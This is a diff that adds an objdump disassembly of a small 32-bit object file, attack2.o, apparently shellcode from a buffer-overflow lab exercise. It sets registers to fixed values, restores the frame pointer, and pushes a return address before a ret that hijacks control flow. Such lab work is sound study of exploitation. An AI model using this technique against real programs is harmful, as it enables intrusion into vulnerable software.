@@ -1,0 +1,11 @@
+
+attack2.o：     文件格式 elf32-i386
+
+
+Disassembly of section .text:
+
+00000000 <.text>:
+   0:	b8 9b 98 43 39       	mov    $0x3943989b,%eax
+   5:	bd f0 2e 68 55       	mov    $0x55682ef0,%ebp
+   a:	68 d6 8c 04 08       	push   $0x8048cd6
+   f:	c3                   	ret    
